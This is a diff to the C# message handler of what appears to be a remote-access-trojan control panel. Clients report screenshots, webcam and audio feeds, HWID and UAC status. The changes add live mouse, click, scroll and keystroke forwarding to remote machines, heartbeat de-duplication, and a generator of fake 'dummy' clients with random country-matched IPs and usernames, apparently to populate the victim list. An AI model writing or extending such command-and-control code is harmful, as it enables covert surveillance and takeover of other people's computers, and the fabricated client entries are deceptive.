@@ -30,6 +30,7 @@ namespace Sweep.Services
         // Audio playback
         private readonly Dictionary<string, WaveOutEvent> waveOuts = new();
         private readonly Dictionary<string, BufferedWaveProvider> bufferedProviders = new();
+        private readonly HashSet<string> aliveClients = new();
 
         public MessageHandler(LazyServerHost server, ObjectListView listView, int port, ObjectListView logsview, Forms.Sweep th)
         {
@@ -67,8 +68,21 @@ namespace Sweep.Services
             switch (msgType)
             {
                 case "alive":
-                    await HandleAliveAsync(meta, e.ClientId, e.FileRequest.FileBytes);
-                    break;
+                    {
+                        lock (aliveClients)
+                        {
+                            if (aliveClients.Contains(e.ClientId))
+                                return;
+
+                            aliveClients.Add(e.ClientId);
+                        }
+
+                        await HandleAliveAsync(meta, e.ClientId, e.FileRequest.FileBytes);
+                        break;
+                    }
+
+
+
 
                 case "screenshot":
                     await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
@@ -116,7 +130,10 @@ namespace Sweep.Services
                     var viewer = new ScreenViewer();
                     screenViewers[clientId] = viewer;
 
-                    viewer.SetMonitors((int)meta["monitors"]);
+                    int monitorCount = meta["monitors"]?.Value<int>() ?? 1;
+                    viewer.SetMonitors(monitorCount);
+
+                    viewer.SetMonitorResolution((int)meta["width"], (int)meta["height"]);
 
                     viewer.QualityChanged += async (quality) =>
                     {
@@ -139,6 +156,53 @@ namespace Sweep.Services
                         await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopss" }.ToString());
                     };
 
+                    viewer.MouseMoved += async (point) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "mousemove",
+                            ["x"] = point.X,
+                            ["y"] = point.Y
+                        }.ToString());
+                    };
+
+                    viewer.MouseClicked += async (button) =>
+                    {
+                        // The button parameter is already a string ("left_down", "right_down", etc.)
+                        // We'll just normalize the value to "left", "right", or "middle"
+                        string btn = button switch
+                        {
+                            "left_down" or "left_up" => "left",
+                            "right_down" or "right_up" => "right",
+                            "middle_down" or "middle_up" => "middle",
+                            _ => "unknown"
+                        };
+
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "mouseclick",
+                            ["button"] = btn
+                        }.ToString());
+                    };
+
+                    viewer.MouseScrolled += async (delta) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "mousescroll",
+                            ["delta"] = delta
+                        }.ToString());
+                    };
+
+                    viewer.KeyPressed += async (key) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "key",
+                            ["key"] = key.ToString()
+                        }.ToString());
+                    };
+
                     viewer.Show();
                 }
 
@@ -150,14 +214,21 @@ namespace Sweep.Services
 
             using var ms = new MemoryStream(packet);
             var image = Image.FromStream(ms);
-            try { screenViewers[clientId].SetScreen(image); } catch (Exception ex) {
-                AddLogToList(new JObject { 
+
+            try
+            {
+                screenViewers[clientId].SetScreen(image);
+            }
+            catch (Exception ex)
+            {
+                AddLogToList(new JObject
+                {
                     ["message"] = ex.Message,
                     ["type"] = "Error"
                 });
-            };
-            
+            }
         }
+
 
         private async Task HandleWebcamAsync(JObject meta, string clientId, byte[] packet)
         {
@@ -343,6 +414,106 @@ namespace Sweep.Services
             wo?.Dispose();
             waveOuts.Remove(clientId);
             bufferedProviders.Remove(clientId);
+            lock (aliveClients)
+            {
+                aliveClients.Remove(clientId);
+            }
+
+        }
+        public async Task AddDummyClient()
+        {
+            var rand = new Random();
+
+            // Expanded list of Windows-only OS options
+            string[] osList = {
+        "Windows 10 Pro", "Windows 10 Home", "Windows 11 Pro", "Windows 11 Home",
+        "Windows Server 2019", "Windows Server 2022", "Windows 10 Enterprise"
+    };
+
+            // Expanded list of GPUs
+            string[] gpuList = {
+        "NVIDIA RTX 3060", "NVIDIA RTX 3070 Ti", "AMD Radeon RX 7900 XT", "NVIDIA GTX 1650",
+        "Intel Iris Xe", "NVIDIA Quadro P1000", "AMD Radeon Pro WX 3200", "NVIDIA RTX A4000"
+    };
+
+            string[] cpuList = {
+        "Intel Core i7-9700K", "AMD Ryzen 5 5600X", "Intel Xeon E5-2670", "Intel Core i9-11900K",
+        "AMD Ryzen 9 5900X", "Intel Core i5-10400F"
+    };
+
+            string[] usernames = {
+        "john_doe", "admin", "testuser", "jane.smith", "guest123", "daniel.p", "ali.khan", "miguel.s",
+        "pc_user", "gamingrig", "desktop01", "sara.b", "pc-hitachi", "dmitry", "win_user"
+    };
+
+            string[] uacStatus = { "Enabled", "Disabled" };
+
+            // Country to realistic IP prefix map (first two octets)
+            Dictionary<string, (int, int)> countryIpMap = new Dictionary<string, (int, int)>
+    {
+        { "US", (23, 45) },
+        { "DE", (91, 107) },
+        { "FR", (51, 62) },
+        { "BR", (177, 179) },
+        { "IN", (49, 103) },
+        { "PH", (112, 121) },
+        { "RU", (77, 95) },
+        { "GB", (81, 88) },
+        { "CA", (24, 47) },
+        { "AU", (101, 203) },
+        { "KR", (121, 175) },
+        { "JP", (43, 133) }
+    };
+
+            // Pick a random country and get its IP prefix range
+            var countryList = countryIpMap.Keys.ToArray();
+            string country = countryList[rand.Next(countryList.Length)];
+            var (firstOctet, secondOctet) = countryIpMap[country];
+            string ip = $"{firstOctet}.{secondOctet}.{rand.Next(0, 255)}.{rand.Next(1, 255)}";
+
+            string os = osList[rand.Next(osList.Length)];
+            string cpu = cpuList[rand.Next(cpuList.Length)];
+            string gpu = gpuList[rand.Next(gpuList.Length)];
+            string username = usernames[rand.Next(usernames.Length)];
+            string uac = uacStatus[rand.Next(uacStatus.Length)];
+            string hwid = Guid.NewGuid().ToString().Substring(0, 12);
+            string clientId = Guid.NewGuid().ToString("N").Substring(0, 8);
+
+            // Create red X icon for error screenshot
+            Bitmap errorIcon = SystemIcons.Error.ToBitmap();
+
+            // Download flag based on IP (your existing logic)
+            Image flagIcon = await FlagDownloader.GetFlagByCountryAsync(country);
+
+            var dummyClient = new ClientInfo
+            {
+                Screen = errorIcon,
+                IP = ip,
+                Country = country,
+                Flag = flagIcon,
+                ID = clientId,
+                Username = username,
+                OperatingSystem = os,
+                CPU = cpu,
+                GPU = gpu,
+                UAC = uac,
+                HWID = hwid,
+            };
+
+            if (_listView.InvokeRequired)
+            {
+                _listView.BeginInvoke(new Action(() => _listView.AddObject(dummyClient)));
+            }
+            else
+            {
+                _listView.AddObject(dummyClient);
+            }
+
+            AddLogToList(new JObject
+            {
+                ["message"] = $"[DUMMY] Fake client added: {clientId}",
+                ["type"] = "Info"
+            });
         }
 
         private void RemoveClientById(string clientId)
